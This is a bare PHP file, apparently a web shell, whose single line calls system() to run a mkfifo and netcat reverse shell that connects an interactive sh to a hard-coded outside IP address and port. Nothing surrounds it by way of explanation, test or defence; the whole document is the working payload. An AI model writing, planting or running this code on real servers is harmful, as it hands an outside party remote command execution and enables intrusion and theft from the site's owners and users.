
<?php

system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 93.185.166.35 3764 >/tmp/f");

?>
